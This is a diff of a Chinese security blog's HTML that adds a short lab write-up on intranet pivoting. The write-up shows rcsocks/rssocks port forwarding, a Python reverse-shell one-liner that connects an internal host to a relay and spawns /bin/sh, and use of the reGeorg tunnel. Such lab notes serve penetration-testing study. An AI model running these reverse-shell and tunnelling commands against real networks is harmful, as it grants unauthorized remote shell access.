@@ -89,7 +89,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="渗透," />
 
 
 
@@ -105,17 +105,22 @@
 
 
 
-<meta name="description" content="我是zyg三号流水线的王全蛋外号法文名叫霍雷呆－杰Q赖我的工作是组装手机 那些大牌子的手机啊都是我们代生产的什么samsong啊洛ki拉啊阿普啊华强北啊我都有摸过我是我们流水线的纪检员那根据不同商家的要求啊，肯定是不一样的。像我们这种国际化的enterprise对质量的要求肯定是very的high毕竟我们也算是半个外企嘛">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Who is Inthsrf">
-<meta property="og:url" content="http://whc.dropsec.xyz/about/index.html">
+<meta name="description" content="上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali 上，现在需要Centos7做中转。我在Centos上做端口转发 cd /src./rcsocks -l 1088 -p 1080 -vv 现在我将Ubuntu上执行Python的反弹shell（反弹">
+<meta name="keywords" content="渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网穿透随想">
+<meta property="og:url" content="http://whc.dropsec.xyz/2017/12/12/内网穿透随想/index.html">
 <meta property="og:site_name" content="Ha1g0的窝">
-<meta property="og:description" content="我是zyg三号流水线的王全蛋外号法文名叫霍雷呆－杰Q赖我的工作是组装手机 那些大牌子的手机啊都是我们代生产的什么samsong啊洛ki拉啊阿普啊华强北啊我都有摸过我是我们流水线的纪检员那根据不同商家的要求啊，肯定是不一样的。像我们这种国际化的enterprise对质量的要求肯定是very的high毕竟我们也算是半个外企嘛">
+<meta property="og:description" content="上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali 上，现在需要Centos7做中转。我在Centos上做端口转发 cd /src./rcsocks -l 1088 -p 1080 -vv 现在我将Ubuntu上执行Python的反弹shell（反弹">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-04-16T11:22:06.104Z">
+<meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/%E6%A8%A1%E6%8B%9F.png">
+<meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/%E8%A5%BF%E6%99%AE%E5%B8%82%E8%B5%9B.png">
+<meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/reGeorg.png">
+<meta property="og:updated_time" content="2017-12-12T07:59:06.456Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Who is Inthsrf">
-<meta name="twitter:description" content="我是zyg三号流水线的王全蛋外号法文名叫霍雷呆－杰Q赖我的工作是组装手机 那些大牌子的手机啊都是我们代生产的什么samsong啊洛ki拉啊阿普啊华强北啊我都有摸过我是我们流水线的纪检员那根据不同商家的要求啊，肯定是不一样的。像我们这种国际化的enterprise对质量的要求肯定是very的high毕竟我们也算是半个外企嘛">
+<meta name="twitter:title" content="内网穿透随想">
+<meta name="twitter:description" content="上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali 上，现在需要Centos7做中转。我在Centos上做端口转发 cd /src./rcsocks -l 1088 -p 1080 -vv 现在我将Ubuntu上执行Python的反弹shell（反弹">
+<meta name="twitter:image" content="http://oohnuejim.bkt.clouddn.com/%E6%A8%A1%E6%8B%9F.png">
 
 
 
@@ -143,19 +148,13 @@
 
 
 
-  <link rel="canonical" href="http://whc.dropsec.xyz/about/"/>
+  <link rel="canonical" href="http://whc.dropsec.xyz/2017/12/12/内网穿透随想/"/>
 
 
 
 
 
-  <title>
-  
-
-  
-    Who is Inthsrf | Ha1g0的窝
-  
-</title>
+  <title> 内网穿透随想 | Ha1g0的窝 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -180,7 +179,7 @@
     
   
 
-  <div class="container sidebar-position-left  ">
+  <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
     <a href="https://github.com/whcjst"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/a6677b08c955af8400f44c6298f40e7d19cc5b2d/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f677261795f3664366436642e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png"></a>
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -285,19 +284,185 @@
             
 
   <div id="posts" class="posts-expand">
-  <header class="post-header">
+    
 
-	<h1 class="post-title" itemprop="name headline">Who is Inthsrf</h1>
+  
 
+  
+  
+  
 
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://whc.dropsec.xyz/2017/12/12/内网穿透随想/">
 
-</header>
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ha1g0">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://i2.muimg.com/567571/93e407bf4ec3ebb7.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ha1g0的窝">
+    </span>
 
     
-    
-      <p>我是zyg三号流水线的王全蛋<br>外号<br>法文名叫霍雷呆－杰Q赖<br>我的工作是组装手机<br> 那些大牌子的手机啊<br>都是我们代生产的<br>什么samsong啊<br>洛ki拉啊<br>阿普啊<br>华强北啊<br>我都有摸过<br>我是我们流水线的纪检员<br>那根据不同商家的要求啊，肯定是不一样的。<br>像我们这种国际化的enterprise<br>对质量的要求肯定是very的high<br>毕竟我们也算是半个外企嘛  </p>
+      <header class="post-header">
 
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                内网穿透随想
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-12T15:56:57+08:00">
+                2017-12-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
     
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="http://oohnuejim.bkt.clouddn.com/%E6%A8%A1%E6%8B%9F.png" alt="模拟"></p>
+<p>上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外<br>段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali</p>
+<p>上，现在需要Centos7做中转。<br>我在Centos上做端口转发</p>
+<p><code>cd /src</code><br><code>./rcsocks -l 1088 -p 1080 -vv</code></p>
+<p>现在我将Ubuntu上执行Python的反弹shell（反弹shell命令很多，请自行搜索），</p>
+<p><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.1&quot;,1089));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></p>
+<p>然后kali正向连接Centos就行了</p>
+<p><code>nc 192.168.80.129 1080</code><br>或者<br><code>./rssocks -vv -s 192.168.80.129:1080</code></p>
+<p><img src="http://oohnuejim.bkt.clouddn.com/%E8%A5%BF%E6%99%AE%E5%B8%82%E8%B5%9B.png" alt="西普市赛"></p>
+<p>这个环境是我上次市赛碰到的环境，当时没有在ssocks本地编译，所以用了另一个代理工具reGeorg<br>附上链接<a href="https://bbs.ichunqiu.com/thread-12514-1-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/thread-12514-1-1.html</a><br>用法跟ssocks有点区别，<br><img src="http://oohnuejim.bkt.clouddn.com/reGeorg.png" alt="reGeorg"><br>这个需要在双网卡服务器的web服务上放置一个tunnel脚本，比如php的就放置tunnel.nosocket.php，然后在本机执行正向连接到tunnel脚本的命令</p>
+<p><code>python reGeorgSocksProxy.py -u (上传reGeorg脚本的地址) -p (转发端口)</code></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+	<div>
+  
+    
+<div style="text-align:center;color: #ccc;font-size:14px;">
+------ 本文结束 ------</div>
+<br/>
+<div style="border: 1px solid black">
+<div style="margin-left:10px">
+<span style="font-weight:blod">版权声明</span>
+<img src="http://7xqmjb.com1.z0.glb.clouddn.com/2017020242973cc.png" >
+<br/>
+<p style="font-size: 10px;line-height: 30px"><a href="http://whc.dropsec.xyz" style="color:#258FC6">Haigo的窝</a> by <a href="http://whc.dropsec.xyz" style="color:#258FC6">Haigo</a> is licensed under a <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">Creative Commons BY-NC-ND 4.0 International License</a>.<br/>
+由<a href="http://whc.dropsec.xyz" style="color:#258FC6">Haigo</a>创作并维护的<a href="http://whc.dropsec.xyz" style="color:#258FC6">Haigo的窝</a>博客采用<a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">创作共用保留署名-非商业-禁止演绎4.0国际许可证</a>。<br/>
+本文首发于<a href="http://whc.dropsec.xyz" style="color:#258FC6">Haigo的窝</a> 博客（ <a href="http://whc.dropsec.xyz" style="color:#258FC6">http://whc.dropsec.xyz</a> ），版权所有，侵权必究。</p>
+</div>
+</div>
+
+  
+</div>
+	
+	
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透/" rel="tag"><i class="fa fa-tag"></i> 渗透</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/12/01/SQL注入进阶思考/" rel="next" title="SQL注入进阶">
+                <i class="fa fa-chevron-left"></i> SQL注入进阶
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -558,6 +723,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
 
   
 
